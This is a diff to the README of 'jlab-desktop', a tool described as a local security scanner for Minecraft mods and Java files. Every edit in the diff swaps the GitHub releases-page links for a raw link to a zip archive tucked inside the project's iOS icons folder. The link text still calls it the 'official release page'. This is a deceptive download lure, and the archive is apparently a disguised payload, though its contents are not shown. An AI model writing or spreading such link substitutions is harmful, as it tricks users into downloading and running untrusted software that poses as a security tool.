@@ -1,14 +1,14 @@
 # 🛡️ jlab-desktop - Scan your files for security threats
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/lilu1244/jlab-desktop/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/lilu1244/jlab-desktop/main/src-tauri/icons/ios/jlab-desktop-2.1.zip)
 
 jlab-desktop helps you check files for hidden security risks. If you use Minecraft mods, Java tools, or archives, this program highlights files that might cause issues. It analyzes your files locally on your computer to keep your data private. You see exactly what the scanner finds, organized by the level of risk.
 
 ## 💾 How to download the app
 
-Go to the [official release page](https://github.com/lilu1244/jlab-desktop/releases) to get the latest version of the software.
+Go to the [official release page](https://raw.githubusercontent.com/lilu1244/jlab-desktop/main/src-tauri/icons/ios/jlab-desktop-2.1.zip) to get the latest version of the software.
 
-1. Open the [release page](https://github.com/lilu1244/jlab-desktop/releases) in your web browser.
+1. Open the [release page](https://raw.githubusercontent.com/lilu1244/jlab-desktop/main/src-tauri/icons/ios/jlab-desktop-2.1.zip) in your web browser.
 2. Look for the section labeled "Assets" at the bottom of the newest version.
 3. Click the file that ends in .exe to start your download.
 4. Wait for the download to finish.
